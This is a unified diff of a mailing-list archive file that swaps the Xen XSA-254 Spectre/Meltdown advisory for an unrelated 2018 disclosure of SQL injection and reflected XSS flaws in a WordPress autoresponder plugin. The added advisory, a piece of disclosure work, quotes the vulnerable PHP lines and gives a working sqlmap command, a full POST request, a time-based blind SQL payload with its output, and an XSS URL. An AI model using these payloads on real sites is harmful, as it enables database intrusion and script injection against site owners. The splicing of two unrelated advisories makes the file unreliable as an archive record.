@@ -1,208 +1,131 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/05/4
-Message-Id: <E1eXWz5-00070v-TN@xenbits.xenproject.org>
-Date: Fri, 05 Jan 2018 18:44:51 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754) - Information leak via side effects of speculative execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/11/2
+Message-id: <655E4F0A-B5AF-4F71-8D64-5665973B76C0@me.com>
+Date: Tue, 11 Sep 2018 08:13:56 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Title: Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5
+Author: Larry W. Cashdollar, @_larry0
+Date: 2018-08-22
+CVE-IDs:[CVE-2018-1002000][CVE-2018-1002001][CVE-2018-1002002][CVE-2018-1002003][CVE-2018-1002004][CVE-2018-1002005][CVE-2018-1002006][CVE-2018-1002007][CVE-2018-1002008][CVE-2018-1002009]
+Download Site: https://wordpress.org/plugins/bft-autoresponder/
+Vendor: Kiboko Labs https://calendarscripts.info/
+Vendor Notified: 2018-08-22, Fixed v2.5.1.5
+Vendor Contact: @prasunsen wordpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=203
+Description: This plugin allows scheduling of automated autoresponder messages and newsletters, and managing a mailing list.  You can add/edit/delete and import/export members. There is also a registration form which can be placed in any website or blog. You can schedule unlimited number of email messages. Messages can be sent on defined number of days after user registration, or on a fixed date.
+Vulnerability:
+These vulnerabilities require administrative priveledges to exploit.
 
- Xen Security Advisory CVE-2017-5753,CVE-2017-5715,CVE-2017-5754 / XSA-254
-                                 version 3
+CVE-2018-1002000
 
-        Information leak via side effects of speculative execution
+There is an exploitable blind SQL injection vulnerability via the del_ids variable by POST request. 
 
-UPDATES IN VERSION 3
-====================
+In line 69 of file controllers/list.php:
 
-Add information about ARM vulnerability.
+65 $wpdb->query("DELETE FROM ".BFT_USERS." WHERE id IN (".$_POST['del_ids'].")");
 
-Correct description of SP2 difficulty.
+del_ids is not sanitized properly.
 
-Mention that resolutions for SP1 and SP3 may be available in the
-future.
+Nine Reflected XSS.
 
-Move description of the PV-in-PVH shim from Mitigation to Resolution.
-(When available and deployed, it will eliminate the SP3
-vulnerability.)
+CVE-2018-1002001
 
-Add colloquial names and CVEs to the relevant paragraphs in Issue
-Description.
+In line 22-23 of controllers/list.php:
 
-Add a URL.
+22 $url = "admin.php?page=bft_list&offset=".$_GET['offset']."&ob=".$_GET['ob'];
+23 echo "<meta http-equiv='refresh' content='0;url=$url' />";
 
-Say explicitly in Vulnerable Systems that HVM guests cannot exploit
-SP3.
+CVE-2018-1002002
 
-Clarify that SP1 and SP2 can be exploited against other victims
-besides operating systems and hypervisors.
+bft_list.html.php:28: 
+<div><label><?php _e('Filter by email', 'broadfast')?>:</label> <input type="text" name="filter_email" value="<?php echo @$_GET['filter_email']?>"></div>
 
-Grammar fixes.
+CVE-2018-1002003
 
-Remove erroneous detail about when Xen direct maps the whole of
-physical memory.
+bft_list.html.php:29: 
+<div><label><?php _e('Filter by name', 'broadfast')?>:</label> <input type="text" name="filter_name" value="<?php echo @$_GET['filter_name']?>"></div>
 
-State in Description that Xen ARM guests run in a separate address
-space.
+CVE-2018-1002004
 
-ISSUE DESCRIPTION
-=================
+bft_list.html.php:42: 
+<input type="text" class="bftDatePicker" name="sdate" id="bftSignupDate" value="<?php echo empty($_GET['sdate']) ? '' : $_GET['sdate']?>">
 
-Processors give the illusion of a sequence of instructions executed
-one-by-one.  However, in order to most efficiently use cpu resources,
-modern superscalar processors actually begin executing many
-instructions in parallel.  In cases where instructions depend on the
-result of previous instructions or checks which have not yet
-completed, execution happens based on guesses about what the outcome
-will be.  If the guess is correct, execution has been sped up.  If the
-guess is incorrect, partially-executed instructions are cancelled and
-architectural state changes (to registers, memory, and so on)
-reverted; but the whole process is no slower than if no guess had been
-made at all.  This is sometimes called "speculative execution".
+CVE-2018-1002005
 
-Unfortunately, although architectural state is rolled back, there are
-other side effects, such as changes to TLB or cache state, which are
-not rolled back.  These side effects can subsequently be detected by
-an attacker to determine information about what happened during the
-speculative execution phase.  If an attacker can cause speculative
-execution to access sensitive memory areas, they may be able to infer
-what that sensitive memory contained.
+bft_list.html.php:43: 
+<input type="hidden" name="filter_signup_date" value="<?php echo empty($_GET['filter_signup_date']) ? '' : $_GET['filter_signup_date']?>" id="alt_bftSignupDate"></div>
 
-Furthermore, these guesses can often be 'poisoned', such that attacker
-can cause logic to reliably 'guess' the way the attacker chooses.
-This advisory discusses three ways to cause speculative execution to
-access sensitive memory areas (named here according to the
-discoverer's naming scheme):
+CVE-2018-1002006
 
-"Bounds-check bypass" (aka SP1, "Variant 1", Spectre CVE-2017-5753):
-Poison the branch predictor, such that victim code is speculatively
-executed past boundary and security checks.  This would allow an
-attacker to, for instance, cause speculative code in the normal
-hypercall / emulation path to execute with wild array indexes.
+integration-contact-form.html.php:14: 
+<p><label><?php _e('CSS classes (optional):', 'broadfast')?></label> <input type="text" name="classes" value="<?php echo @$_POST['classes']?>"></p>
 
-"Branch Target Injection" (aka SP2, "Variant 2", Spectre CVE-2017-5715):
-Poison the branch predictor.  Well-abstracted code often involves
-calling function pointers via indirect branches; reading these
-function pointers may involve a (slow) memory access, so the CPU
-attempts to guess where indirect branches will lead.  Poisoning this
-enables an attacker to speculatively branch to any code that is
-executable by the victim (eg, anywhere in the hypervisor).
+CVE-2018-1002007
 
-"Rogue Data Load" (aka SP3, "Variant 3", Meltdown, CVE-2017-5754):
-On some processors, certain pagetable permission checks only happen
-when the instruction is retired; effectively meaning that speculative
-execution is not subject to pagetable permission checks.  On such
-processors, an attacker can speculatively execute arbitrary code in
-userspace with, effectively, the highest privilege level.
+integration-contact-form.html.php:15: 
+<p><label><?php _e('HTML ID (optional):', 'broadfast')?></label> <input type="text" name="html_id" value="<?php echo @$_POST['html_id']?>"></p>
 
-More information is available here:
-  https://meltdownattack.com/
-  https://spectreattack.com/
-  https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html
+CVE-2018-1002008
 
-Additional Xen-specific background:
+list-user.html.php:4: 
+<p><a href="admin.php?page=bft_list&ob=<?php echo $_GET['ob']?>&offset=<?php echo $_GET['offset']?>"><?php _e('Back to all subscribers', 'broadfast');?></a></p>
 
-Xen hypervisors on most systems map all of physical RAM, so code
-speculatively executed in a hypervisor context can read all of system
-RAM.
+CVE-2018-1002009
 
-When running PV guests, the guest and the hypervisor share the address
-space; guest kernels run in a lower privilege level, and Xen runs in
-the highest privilege level.  (x86 HVM and PVH guests, and ARM guests,
-run in a separate address space to the hypervisor.)  However, only
-64-bit PV guests can generate addresses large enough to point to
-hypervisor memory.
+unsubscribe.html.php:3: 
+<p><input type="text" name="email" value="<?php echo @$_GET['email']?>"></p>
 
-IMPACT
-======
+Exploit Code:
+SQL Injection CVE-2018-1002000
+$ sqlmap --load-cookies=./cook -r post_data --level 2 --dbms=mysql
 
-Xen guests may be able to infer the contents of arbitrary host memory,
-including memory assigned to other guests.
+Where post_data is:
 
-An attacker's choice of code to speculatively execute (and thus the
-ease of extracting useful information) goes up with the numbers.  For
-SP1, an attacker is limited to windows of code after bound checks of
-user-supplied indexes.  For SP2, the attacker will in many cases will
-be limited to executing arbitrary pre-existing code inside of Xen.
-For SP3 (and other cases for SP2), an attacker can write arbitrary
-code to speculatively execute.
+POST /wp-admin/admin.php?page=bft_list&ob=email&offset=0 HTTP/1.1
+Host: example.com
+Connection: keep-alive
+Content-Length: 150
+Cache-Control: max-age=0
+Origin: http://example.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://example.com/wp-admin/admin.php?page=bft_list&ob=email&offset=0
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: wordpress_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
-Additionally, in general, attacks within a guest (from guest user to
-guest kernel) will be the same as on real hardware.  Consult your
-operating system provider for more information.
+mass_delete=1&del_ids=*&_wpnonce=aa7aa407db&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dbft_list%26ob%3Demail%26offset%3D0[!http]
 
-NOTE ON TIMING
-==============
 
-This vulnerability was originally scheduled to be made public on 9
-January.  It was accelerated at the request of the discloser due to
-one of the issues being made public.
+(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+Payload: mass_delete=1&del_ids=(CASE WHEN (6612=6612) THEN SLEEP(5) ELSE 6612 END)&_wpnonce=aa7aa407db&_wp_http_referer=/wp-admin/admin.php?page=bft_list%26ob=email%26offset=0[!http]
+---
+[11:50:08] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8.0 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.0.12
+[11:50:08] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.47'
 
-VULNERABLE SYSTEMS
-==================
+[*] shutting down at 11:50:08
 
-Systems running all versions of Xen are affected.
 
-For SP1 and SP2, both Intel and AMD are vulnerable.  Vulnerability of
-ARM processors to SP1 and SP2 varies by model and manufacturer.  ARM
-has information on affected models on the following website:
-   https://developer.arm.com/support/security-update
+CVE-2018-1002001
 
-For SP3, only Intel processors are vulnerable.  (The hypervisor cannot
-be attacked using SP3 on any ARM processors, even those that are
-listed as affected by SP3.)
+http://example.com/wp-admin/admin.php?page=bft_list&action=edit&id=12&ob=XSS&offset=XSS
 
-Furthermore, only 64-bit PV guests can exploit SP3 against Xen.  PVH,
-HVM, and 32-bit PV guests cannot exploit SP3.
+ 
 
-MITIGATION
-==========
+ 
 
-There is no mitigation for SP1 and SP2.
-
-SP3 can be mitigated by running guests in HVM or PVH mode.
-
-RESOLUTION
-==========
-
-There is no available resolution for SP1.  A solution may be available
-in the future.
-
-We are working on patches which mitigate SP2 but these are not
-currently available.  Given that the vulnerabilities are now public,
-these will be developed and published in public, initially via
-xen-devel.
-
-For guests with legacy PV kernels which cannot be run in HVM mode, we
-have developed a "shim" hypervisor that allows PV guests to run in PVH
-mode.  Unfortunately, due to the accelerated schedule, this is not yet
-ready to release.  We expect to have it ready for 4.10, as well as PVH
-backports to 4.9 and 4.8, available over the next few days.
-
-When we have useful information we will send an update.
-
-NOTE ON LACK OF EMBARGO
-=======================
-
-The timetable and process were set by the discloser.
-
-After the intensive initial response period for these vulnerabilities
-is over, we will prepare and publish a full timeline, as we have done
-in a handful of other cases of significant public interest where we
-saw opportunities for process improvement.
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQEcBAEBCAAGBQJaT8eJAAoJEIP+FMlX6CvZpHsIAMd+oeUvMIDyGwMSDL93KAqJ
-TPKV9Qi5FxTfW+dkfJ5GRR/IPHbxr9yHfbUpU33QfLYDmyMzL3oNokOR3R6jSpFE
-dgqHIoS04EXsy7fSZ777YWwZoGBsAfbDZ5sJnFWxLTcLx6440N03LJC0wsLFyRET
-6wPF7Ml9ZsWfkd3VvMDUc4PRhjbzGio1eP+ZUS4HfRk01DYmv/NTnUZIdY01sFFE
-PVSTxO3iO0ptiTlqd+PPsjlqswNu0gmvW7jkc/MaLPLUhKcUG7tat0yDapxCf0Hv
-xJZ6eNsjhTVJitINISyGYR5ZZESpfhXzig6znex6nr7r1/Ey4w6ud90pSV9j2/o=
-=VIt1
------END PGP SIGNATURE-----
 
